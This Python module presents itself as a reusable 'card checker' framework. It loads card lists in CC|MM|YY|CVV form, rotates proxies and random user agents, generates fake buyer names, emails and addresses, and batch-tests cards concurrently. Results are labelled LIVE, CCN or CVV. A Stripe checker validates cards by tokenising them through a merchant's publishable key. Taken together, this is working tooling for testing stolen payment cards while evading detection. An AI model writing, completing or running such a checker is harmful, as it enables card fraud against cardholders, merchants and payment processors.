"""
Python Base Checker - A reusable foundation for card checking operations
This module provides base classes and utilities that can be extended for different platforms.
"""

import asyncio
import aiohttp
import httpx
import random
import string
import re
import json
import time
from abc import ABC, abstractmethod
from typing import Optional, Tuple, Dict, List, Any
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse


# ==================== ENUMS ====================

class CardStatus(Enum):
    """Card check result statuses"""
    LIVE = "LIVE"
    DEAD = "DEAD"
    DECLINED = "DECLINED"
    UNKNOWN = "UNKNOWN"
    ERROR = "ERROR"
    CCN = "CCN"  # Card Check Number (Valid but declined)
    CVV = "CVV"  # Invalid CVV
    EXPIRED = "EXPIRED"
    INSUFFICIENT = "INSUFFICIENT"
    RATE_LIMITED = "RATE_LIMITED"


class ProxyType(Enum):
    """Supported proxy types"""
    HTTP = "http"
    HTTPS = "https"
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"


# ==================== DATA CLASSES ====================

@dataclass
class Card:
    """Card data container"""
    number: str
    month: str
    year: str
    cvv: str
    
    @classmethod
    def from_string(cls, card_str: str, delimiter: str = "|") -> "Card":
        """Parse card from string format: CC|MM|YY|CVV or CC|MM|YYYY|CVV"""
        parts = [p.strip() for p in card_str.split(delimiter)]
        if len(parts) < 4:
            raise ValueError(f"Invalid card format: {card_str}")
        
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        # Normalize month
        mm = mm.zfill(2)
        
        # Normalize year (convert 2-digit to 4-digit)
        if len(yy) == 2:
            yy = f"20{yy}"
        
        return cls(number=cc, month=mm, year=yy, cvv=cvv)
    
    def to_string(self, delimiter: str = "|") -> str:
        """Convert card back to string format"""
        return f"{self.number}{delimiter}{self.month}{delimiter}{self.year}{delimiter}{self.cvv}"
    
    @property
    def bin(self) -> str:
        """Get card BIN (first 6 digits)"""
        return self.number[:6]
    
    @property
    def last_four(self) -> str:
        """Get last 4 digits of card"""
        return self.number[-4:]
    
    @property
    def brand(self) -> str:
        """Detect card brand from number"""
        num = self.number
        if num.startswith('4'):
            return 'Visa'
        elif num.startswith(('51', '52', '53', '54', '55')) or (2221 <= int(num[:4]) <= 2720):
            return 'Mastercard'
        elif num.startswith(('34', '37')):
            return 'Amex'
        elif num.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
            return 'Discover'
        elif num.startswith('35'):
            return 'JCB'
        else:
            return 'Unknown'
    
    def is_valid_luhn(self) -> bool:
        """Validate card number using Luhn algorithm"""
        digits = [int(d) for d in self.number]
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(divmod(d * 2, 10))
        return checksum % 10 == 0


@dataclass
class CheckResult:
    """Result of a card check"""
    status: CardStatus
    message: str
    card: Optional[Card] = None
    gateway: str = "Unknown"
    response_time: float = 0.0
    extra_data: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> dict:
        """Convert result to dictionary"""
        return {
            "status": self.status.value,
            "message": self.message,
            "card": self.card.to_string() if self.card else None,
            "gateway": self.gateway,
            "response_time": round(self.response_time, 2),
            "extra_data": self.extra_data
        }
    
    def __str__(self) -> str:
        return f"[{self.status.value}] {self.message}"


@dataclass
class ProxyConfig:
    """Proxy configuration"""
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    proxy_type: ProxyType = ProxyType.HTTP
    
    @classmethod
    def from_string(cls, proxy_str: str) -> "ProxyConfig":
        """
        Parse proxy from string format:
        - host:port
        - host:port:user:pass
        - user:pass@host:port
        - type://host:port
        - type://user:pass@host:port
        """
        proxy_type = ProxyType.HTTP
        
        # Check for protocol prefix
        for pt in ProxyType:
            if proxy_str.startswith(f"{pt.value}://"):
                proxy_type = pt
                proxy_str = proxy_str[len(f"{pt.value}://"):]
                break
        
        # Check for user:pass@host:port format
        if '@' in proxy_str:
            auth, addr = proxy_str.rsplit('@', 1)
            user, passwd = auth.split(':', 1)
            host, port = addr.rsplit(':', 1)
            return cls(host=host, port=int(port), username=user, password=passwd, proxy_type=proxy_type)
        
        parts = proxy_str.split(':')
        if len(parts) == 2:
            return cls(host=parts[0], port=int(parts[1]), proxy_type=proxy_type)
        elif len(parts) == 4:
            return cls(host=parts[0], port=int(parts[1]), username=parts[2], password=parts[3], proxy_type=proxy_type)
        else:
            raise ValueError(f"Invalid proxy format: {proxy_str}")
    
    def to_url(self) -> str:
        """Convert to proxy URL format"""
        auth = ""
        if self.username and self.password:
            auth = f"{self.username}:{self.password}@"
        return f"{self.proxy_type.value}://{auth}{self.host}:{self.port}"


# ==================== UTILITIES ====================

class RandomDataGenerator:
    """Generate random test data"""
    
    FIRST_NAMES = [
        'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph',
        'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark',
        'Mary', 'Patricia', 'Jennifer', 'Linda', 'Barbara', 'Elizabeth', 'Susan',
        'Jessica', 'Sarah', 'Karen', 'Lisa', 'Nancy', 'Betty', 'Margaret', 'Sandra'
    ]
    
    LAST_NAMES = [
        'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis',
        'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson',
        'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson',
        'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson'
    ]
    
    EMAIL_DOMAINS = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'mail.com']
    
    US_ADDRESSES = [
        {"street": "123 Main Street", "city": "New York", "state": "NY", "zip": "10001", "phone": "2125551234"},
        {"street": "456 Oak Avenue", "city": "Los Angeles", "state": "CA", "zip": "90001", "phone": "3235551234"},
        {"street": "789 Pine Road", "city": "Chicago", "state": "IL", "zip": "60601", "phone": "3125551234"},
        {"street": "321 Elm Street", "city": "Houston", "state": "TX", "zip": "77001", "phone": "7135551234"},
        {"street": "654 Maple Drive", "city": "Phoenix", "state": "AZ", "zip": "85001", "phone": "6025551234"},
        {"street": "987 Cedar Lane", "city": "Miami", "state": "FL", "zip": "33101", "phone": "3055551234"},
        {"street": "147 Birch Court", "city": "Seattle", "state": "WA", "zip": "98101", "phone": "2065551234"},
        {"street": "258 Walnut Way", "city": "Denver", "state": "CO", "zip": "80201", "phone": "3035551234"},
    ]
    
    ADDRESSES_BY_COUNTRY = {
        "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125551234"},
        "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
        "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
        "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
        "DE": {"address1": "Friedrichstraße 123", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "301234567"},
        "FR": {"address1": "15 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "countryCode": "FR", "phone": "142345678"},
        "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
        "JP": {"address1": "1-1 Shibuya", "city": "Tokyo", "postalCode": "150-0002", "zoneCode": "13", "countryCode": "JP", "phone": "312345678"},
    }
    
    @classmethod
    def first_name(cls) -> str:
        return random.choice(cls.FIRST_NAMES)
    
    @classmethod
    def last_name(cls) -> str:
        return random.choice(cls.LAST_NAMES)
    
    @classmethod
    def full_name(cls) -> Tuple[str, str]:
        return cls.first_name(), cls.last_name()
    
    @classmethod
    def email(cls, first_name: Optional[str] = None, last_name: Optional[str] = None) -> str:
        first = first_name or cls.first_name()
        last = last_name or cls.last_name()
        num = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
        domain = random.choice(cls.EMAIL_DOMAINS)
        
        formats = [
            f"{first.lower()}.{last.lower()}{num}@{domain}",
            f"{first.lower()}{last.lower()}{num}@{domain}",
            f"{first.lower()[0]}{last.lower()}{num}@{domain}",
            f"{first.lower()}{num}@{domain}",
        ]
        return random.choice(formats)
    
    @classmethod
    def phone(cls, country: str = "US") -> str:
        if country == "US":
            area = random.choice(['212', '310', '312', '415', '617', '713', '786', '206', '303', '404'])
            return f"{area}{''.join(random.choices(string.digits, k=7))}"
        return ''.join(random.choices(string.digits, k=10))
    
    @classmethod
    def address(cls, country: str = "US") -> dict:
        if country in cls.ADDRESSES_BY_COUNTRY:
            return cls.ADDRESSES_BY_COUNTRY[country].copy()
        return random.choice(cls.US_ADDRESSES).copy()
    
    @classmethod
    def user_agent(cls) -> str:
        """Generate random user agent"""
        chrome_versions = ['120', '121', '122', '123', '124', '125']
        platforms = [
            'Windows NT 10.0; Win64; x64',
            'Macintosh; Intel Mac OS X 10_15_7',
            'X11; Linux x86_64',
        ]
        version = random.choice(chrome_versions)
        platform = random.choice(platforms)
        return f'Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36'


class TextExtractor:
    """Utility class for extracting text between patterns"""
    
    @staticmethod
    def between(text: str, start: str, end: str) -> Optional[str]:
        """Extract text between two strings"""
        try:
            start_idx = text.index(start) + len(start)
            end_idx = text.index(end, start_idx)
            return text[start_idx:end_idx]
        except ValueError:
            return None
    
    @staticmethod
    def between_all(text: str, start: str, end: str) -> List[str]:
        """Extract all occurrences between two strings"""
        results = []
        search_start = 0
        while True:
            try:
                start_idx = text.index(start, search_start) + len(start)
                end_idx = text.index(end, start_idx)
                results.append(text[start_idx:end_idx])
                search_start = end_idx + len(end)
            except ValueError:
                break
        return results
    
    @staticmethod
    def regex(text: str, pattern: str, group: int = 1) -> Optional[str]:
        """Extract using regex pattern"""
        match = re.search(pattern, text)
        return match.group(group) if match else None
    
    @staticmethod
    def regex_all(text: str, pattern: str, group: int = 1) -> List[str]:
        """Extract all matches using regex pattern"""
        return [m.group(group) for m in re.finditer(pattern, text)]
    
    @staticmethod
    def json_value(text: str, key: str) -> Optional[Any]:
        """Extract value from JSON string by key"""
        pattern = rf'"{key}"\s*:\s*"?([^",\}}\]]+)"?'
        match = re.search(pattern, text)
        return match.group(1) if match else None


# ==================== BASE CHECKER CLASS ====================

class BaseChecker(ABC):
    """
    Abstract base class for card checkers.
    Extend this class to create platform-specific checkers.
    """
    
    def __init__(self, proxy: Optional[str] = None, timeout: int = 30):
        """
        Initialize the checker.
        
        Args:
            proxy: Optional proxy string (format: host:port or host:port:user:pass)
            timeout: Request timeout in seconds
        """
        self.proxy: Optional[ProxyConfig] = None
        if proxy:
            self.proxy = ProxyConfig.from_string(proxy)
        
        self.timeout = timeout
        self.session: Optional[aiohttp.ClientSession] = None
        self.httpx_client: Optional[httpx.AsyncClient] = None
        
        # Utilities
        self.data_gen = RandomDataGenerator()
        self.extractor = TextExtractor()
    
    async def __aenter__(self):
        """Async context manager entry"""
        await self.create_session()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        await self.close_session()
    
    async def create_session(self):
        """Create HTTP session with optional proxy"""
        proxy_url = self.proxy.to_url() if self.proxy else None
        
        # Create aiohttp session
        connector = aiohttp.TCPConnector(ssl=False, limit=100)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        )
        
        # Create httpx client
        self.httpx_client = httpx.AsyncClient(
            proxy=proxy_url,
            timeout=self.timeout,
            verify=False,
            follow_redirects=True
        )
    
    async def close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()
        if self.httpx_client:
            await self.httpx_client.aclose()
    
    def get_headers(self, extra: Optional[dict] = None) -> dict:
        """Get default headers with optional extras"""
        headers = {
            'User-Agent': self.data_gen.user_agent(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }
        if extra:
            headers.update(extra)
        return headers
    
    async def get(self, url: str, **kwargs) -> aiohttp.ClientResponse:
        """Make GET request"""
        proxy = self.proxy.to_url() if self.proxy else None
        headers = kwargs.pop('headers', self.get_headers())
        return await self.session.get(url, headers=headers, proxy=proxy, **kwargs)
    
    async def post(self, url: str, **kwargs) -> aiohttp.ClientResponse:
        """Make POST request"""
        proxy = self.proxy.to_url() if self.proxy else None
        headers = kwargs.pop('headers', self.get_headers())
        return await self.session.post(url, headers=headers, proxy=proxy, **kwargs)
    
    async def get_httpx(self, url: str, **kwargs) -> httpx.Response:
        """Make GET request using httpx"""
        headers = kwargs.pop('headers', self.get_headers())
        return await self.httpx_client.get(url, headers=headers, **kwargs)
    
    async def post_httpx(self, url: str, **kwargs) -> httpx.Response:
        """Make POST request using httpx"""
        headers = kwargs.pop('headers', self.get_headers())
        return await self.httpx_client.post(url, headers=headers, **kwargs)
    
    @abstractmethod
    async def check(self, card: Card) -> CheckResult:
        """
        Check a card. Must be implemented by subclasses.
        
        Args:
            card: Card object to check
            
        Returns:
            CheckResult with status and message
        """
        pass
    
    async def check_str(self, card_str: str, delimiter: str = "|") -> CheckResult:
        """
        Check a card from string format.
        
        Args:
            card_str: Card string in format CC|MM|YY|CVV
            delimiter: Delimiter between card parts
            
        Returns:
            CheckResult with status and message
        """
        try:
            card = Card.from_string(card_str, delimiter)
            return await self.check(card)
        except ValueError as e:
            return CheckResult(
                status=CardStatus.ERROR,
                message=str(e)
            )
    
    async def check_batch(self, cards: List[str], concurrency: int = 5) -> List[CheckResult]:
        """
        Check multiple cards with concurrency control.
        
        Args:
            cards: List of card strings
            concurrency: Maximum concurrent checks
            
        Returns:
            List of CheckResults
        """
        semaphore = asyncio.Semaphore(concurrency)
        
        async def limited_check(card_str: str) -> CheckResult:
            async with semaphore:
                return await self.check_str(card_str)
        
        tasks = [limited_check(card) for card in cards]
        return await asyncio.gather(*tasks)
    
    def parse_response(self, response_text: str) -> CardStatus:
        """
        Parse common response patterns to determine card status.
        Override in subclass for platform-specific parsing.
        """
        text = response_text.lower()
        
        # Live indicators
        if any(x in text for x in ['succeeded', 'approved', 'success', 'charged', 'thank you']):
            return CardStatus.LIVE
        
        # CVV errors
        if any(x in text for x in ['cvv', 'cvc', 'security code', 'security_code_invalid']):
            return CardStatus.CVV
        
        # Expired
        if any(x in text for x in ['expired', 'expiration', 'expiry']):
            return CardStatus.EXPIRED
        
        # Insufficient funds
        if any(x in text for x in ['insufficient', 'not enough', 'balance']):
            return CardStatus.INSUFFICIENT
        
        # Rate limited
        if any(x in text for x in ['rate limit', 'too many', 'try again later']):
            return CardStatus.RATE_LIMITED
        
        # Generic declines
        if any(x in text for x in ['declined', 'decline', 'denied', 'reject', 'failed', 'do_not_honor']):
            return CardStatus.DECLINED
        
        return CardStatus.UNKNOWN
    
    @staticmethod
    def format_result(result: CheckResult) -> str:
        """Format result for display"""
        status_colors = {
            CardStatus.LIVE: "\033[92m",  # Green
            CardStatus.DEAD: "\033[91m",  # Red
            CardStatus.CCN: "\033[93m",   # Yellow
            CardStatus.CVV: "\033[93m",   # Yellow
            CardStatus.DECLINED: "\033[91m",  # Red
            CardStatus.ERROR: "\033[91m", # Red
            CardStatus.UNKNOWN: "\033[94m",  # Blue
        }
        reset = "\033[0m"
        color = status_colors.get(result.status, "")
        
        card_info = result.card.to_string() if result.card else "N/A"
        return f"{color}[{result.status.value}]{reset} {card_info} - {result.message} ({result.response_time}s)"


# ==================== EXAMPLE IMPLEMENTATIONS ====================

class GenericStripeChecker(BaseChecker):
    """
    Example checker for Stripe-based sites.
    This is a template - customize for specific sites.
    """
    
    def __init__(self, publishable_key: str, **kwargs):
        super().__init__(**kwargs)
        self.pk = publishable_key
    
    async def get_stripe_token(self, card: Card) -> Optional[str]:
        """Get Stripe payment method token"""
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': self.data_gen.user_agent(),
        }
        
        data = {
            'type': 'card',
            'card[number]': card.number,
            'card[exp_month]': card.month,
            'card[exp_year]': card.year,
            'card[cvc]': card.cvv,
            'key': self.pk,
        }
        
        async with self.session.post(
            'https://api.stripe.com/v1/payment_methods',
            data=data,
            headers=headers
        ) as resp:
            result = await resp.json()
            return result.get('id')
    
    async def check(self, card: Card) -> CheckResult:
        """Check card using Stripe"""
        start = time.time()
        
        try:
            if not await self.create_session():
                pass  # Session already exists
            
            token = await self.get_stripe_token(card)
            elapsed = time.time() - start
            
            if token:
                return CheckResult(
                    status=CardStatus.CCN,
                    message=f"Token: {token[:20]}...",
                    card=card,
                    gateway="Stripe",
                    response_time=elapsed
                )
            else:
                return CheckResult(
                    status=CardStatus.DECLINED,
                    message="Failed to tokenize",
                    card=card,
                    gateway="Stripe",
                    response_time=elapsed
                )
                
        except Exception as e:
            return CheckResult(
                status=CardStatus.ERROR,
                message=str(e),
                card=card,
                response_time=time.time() - start
            )


# ==================== HELPER FUNCTIONS ====================

def load_cards(filepath: str, delimiter: str = "|") -> List[Card]:
    """Load cards from file"""
    cards = []
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                try:
                    cards.append(Card.from_string(line, delimiter))
                except ValueError:
                    continue
    return cards


def load_proxies(filepath: str) -> List[ProxyConfig]:
    """Load proxies from file"""
    proxies = []
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                try:
                    proxies.append(ProxyConfig.from_string(line))
                except ValueError:
                    continue
    return proxies


async def run_checker(
    checker_class: type,
    cards: List[str],
    concurrency: int = 5,
    **checker_kwargs
) -> List[CheckResult]:
    """
    Run checker on list of cards.
    
    Args:
        checker_class: BaseChecker subclass to use
        cards: List of card strings
        concurrency: Maximum concurrent checks
        **checker_kwargs: Additional arguments for checker
        
    Returns:
        List of CheckResults
    """
    async with checker_class(**checker_kwargs) as checker:
        return await checker.check_batch(cards, concurrency)


# ==================== MAIN EXAMPLE ====================

if __name__ == "__main__":
    # Example usage
    print("Python Base Checker Framework")
    print("=" * 40)
    
    # Test Card parsing
    test_card = Card.from_string("4111111111111111|12|2025|123")
    print(f"Card: {test_card.to_string()}")
    print(f"BIN: {test_card.bin}")
    print(f"Brand: {test_card.brand}")
    print(f"Luhn Valid: {test_card.is_valid_luhn()}")
    
    print()
    
    # Test random data generation
    first, last = RandomDataGenerator.full_name()
    print(f"Random Name: {first} {last}")
    print(f"Random Email: {RandomDataGenerator.email(first, last)}")
    print(f"Random Address: {RandomDataGenerator.address('US')}")
    
    print()
    
    # Test proxy parsing
    test_proxy = ProxyConfig.from_string("192.168.1.1:8080:user:pass")
    print(f"Proxy URL: {test_proxy.to_url()}")
    
    print()
    print("To create a custom checker, extend BaseChecker and implement the check() method.")
